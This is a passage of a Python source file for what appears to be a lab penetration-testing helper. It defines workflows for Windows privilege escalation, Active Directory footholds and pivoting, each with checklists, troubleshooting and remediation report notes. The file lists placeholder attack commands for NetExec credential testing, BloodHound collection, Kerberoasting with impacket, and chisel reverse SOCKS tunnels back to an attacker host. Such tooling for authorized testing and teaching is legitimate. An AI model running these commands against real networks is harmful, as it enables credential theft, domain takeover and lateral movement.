            "If you used token impersonation, verify the elevated process is stable before pivoting from it.",
        ),
        troubleshooting=(
            (
                "SeImpersonatePrivilege is present but the technique fails",
                "OS build is patched against that specific variant.",
                "Match the technique to the build (e.g. PrintSpoofer vs the Potato family) and confirm a named pipe is reachable.",
            ),
            (
                "Unquoted service path found but you cannot write to the folder",
                "Directory ACLs block the write.",
                "Check every folder in the path with `icacls`; only a writable intermediate folder is exploitable.",
            ),
            (
                "Enumeration flags a credential that does not work",
                "Credential is stale or rotated.",
                "Try it against other services (SMB / WinRM) with NetExec before discarding — reuse is common in labs.",
            ),
        ),
        report_note="Privilege escalation on [TARGET_HOST] was possible via [token privilege abuse / unquoted service path / stored credentials]. Recommend removing the privilege from the affected account, quoting service binary paths, clearing stored credentials, and enforcing least privilege.",
    ),
    "ad-foothold": Workflow(
        service_id="ad-foothold",
        display_name="AD Foothold",
        related=("windows-privesc", "pivoting"),
        category="post-foothold",
        title="Active Directory Foothold — First Steps with a Domain Credential",
        priority=52,
        when_to_use="You hold any valid domain credential or a shell on a domain-joined host. Map the domain before attacking — the shortest path to Domain Admin is usually an existing misconfiguration, not an exploit.",
        checklist=(
            "Validate the credential and identify what it can reach.",
            "Collect BloodHound data and review paths to high-value targets.",
            "Enumerate domain users, groups, and the password policy.",
            "Hunt for Kerberoastable and AS-REP-roastable accounts.",
            "Check for ACL-based escalation edges (GenericWrite, WriteDACL, etc.).",
            "Test the recovered credential for reuse across other hosts.",
        ),
        commands=(
            (
                "nxc smb [TARGET_IP] -u [USER] -p [PASS]",
                "Validate the credential and see whether it is local admin anywhere.",
            ),
            (
                "bloodhound-python -d [DOMAIN] -u [USER] -p [PASS] -ns [TARGET_IP] -c All",
                "Collect graph data; import into BloodHound and run shortest-path queries.",
            ),
            (
                "nxc ldap [TARGET_IP] -u [USER] -p [PASS] --users --groups",
                "Enumerate domain users and group memberships.",
            ),
            (
                "impacket-GetUserSPNs [DOMAIN]/[USER]:[PASS] -dc-ip [TARGET_IP] -request",
                "Request Kerberoastable service ticket hashes for offline cracking.",
            ),
            (
                "nxc smb [TARGET_IP] -u [USER] -p [PASS] --shares",
                "Readable/writable shares — a common source of further credentials.",
            ),
        ),
        expected_output="A domain map: who you are, what you can reach, BloodHound paths toward Domain Admin, and any roastable accounts or ACL edges available to abuse.",
        verification=(
            "Confirm BloodHound ingested the data — the node count should match the domain size, not be zero.",
            "Before chasing a BloodHound path, re-verify each edge still exists; lab state can drift between collections.",
        ),
        troubleshooting=(
            (
                "`bloodhound-python` fails with a clock-skew error",
                "Host time differs from the DC by more than five minutes.",
                "Sync time with `sudo ntpdate [TARGET_IP]` or `sudo rdate -n [TARGET_IP]`, then retry.",
            ),
            (
                "Credential validates on the DC but not on member servers",
                "It is a low-privilege domain user with no local admin rights.",
                "Use it for enumeration and roasting; look for a path to a more privileged account in BloodHound.",
            ),
            (
                "Kerberoasting returns no SPNs",
                "No service accounts, or the user cannot read them.",
                "Pivot to AS-REP roasting (`GetNPUsers`) and ACL-based escalation paths.",
            ),
        ),
        report_note="With a single valid domain credential, [DOMAIN] exposed [Kerberoastable accounts / ACL escalation edges / credential reuse] leading toward Domain Admin. Recommend strong service-account passwords, removing dangerous ACLs, and enforcing unique local administrator passwords (LAPS).",
    ),
    "pivoting": Workflow(
        service_id="pivoting",
        display_name="Pivoting",
        related=("linux-privesc", "windows-privesc"),
        category="lateral-movement",
        title="Pivoting — Tunneling & Internal Network Access",
        priority=60,
        when_to_use="You have a foothold on a host that can reach an internal segment you cannot. Use the foothold to route traffic into that segment for authorized lab testing only.",
        checklist=(
            "Map what the foothold host can reach — interfaces, routes, ARP neighbours.",
            "Identify internal hosts and services not exposed externally.",
            "Establish a tunnel or port forward back to your attack box.",
            "Confirm tooling works through the tunnel before deep enumeration.",
            "Document the pivot path for the report.",
        ),
        commands=(
            (
                "ip a; ip route; arp -a",
                "Local interfaces, routes, and recently-seen neighbours on the internal segment.",
            ),
            (
                "ssh -D 1080 [USER]@[TARGET_IP]",
                "Dynamic SOCKS proxy through the foothold; point proxychains at 127.0.0.1:1080.",
            ),
            (
                "./chisel server -p [LPORT] --reverse   # on the attack box",
                "Start a chisel server on your attack box for a reverse tunnel.",
            ),
            (
                "./chisel client [LHOST]:[LPORT] R:socks   # on the foothold host",
                "Connect back from the foothold to expose a SOCKS proxy over the tunnel.",
            ),
            (
                "proxychains nmap -sT -Pn -p 445,3389 [TARGET_IP]",
                "Run tooling through the proxy against internal lab hosts.",
            ),
        ),
        expected_output="A working tunnel: internal lab hosts reachable from your attack box via proxychains, plus a clear picture of the internal segment's live hosts and services.",
        verification=(
            "Confirm the tunnel with a simple `proxychains curl` or `proxychains nmap -sT` against a known internal host before larger scans.",
            "Remember proxychains needs full TCP connect scans (`-sT -Pn`) — SYN scans do not traverse SOCKS.",
        ),
        troubleshooting=(
            (
                "proxychains hangs or times out",
                "Tunnel is down, or the scan type cannot traverse SOCKS.",
                "Verify the tunnel process is alive; use `-sT -Pn`; lower the timeouts in the proxychains config.",
            ),
            (
                "chisel client cannot reach the attack box",
                "Egress filtering on the foothold network.",
                "Try a commonly-allowed port for [LPORT] (443 / 80) and confirm the server is bound and reachable.",
            ),
            (
                "Internal host responds to ping but no ports open through the tunnel",
                "Host firewall, or the wrong protocol is being scanned.",
                "Confirm with a known-open service; use TCP connect scans; some hosts block ICMP but allow TCP.",
            ),
        ),
        report_note="The foothold on [TARGET_IP] provided a route into [internal segment], otherwise unreachable from the test network. Recommend network segmentation and egress filtering so a single compromised host cannot bridge security boundaries.",
    ),
}


def lookup(service_id: str) -> Workflow | None:
    return _WORKFLOWS.get(service_id)


def all_ids() -> list[str]:
    return list(_WORKFLOWS.keys())


def resolve(service_ids: list[str]) -> list[Workflow]:
    """Return unique workflows in priority order (lower value first)."""
    seen: dict[str, Workflow] = {}
    for sid in service_ids:
        workflow = _WORKFLOWS.get(sid)
        if workflow is not None and sid not in seen:
            seen[sid] = workflow
    return sorted(seen.values(), key=lambda w: (w.priority, w.service_id))


def by_category(category: str) -> list[Workflow]:
    """Return all workflows in a category, sorted by priority then ID."""
    return sorted(
        (w for w in _WORKFLOWS.values() if w.category == category),
        key=lambda w: (w.priority, w.service_id),
    )
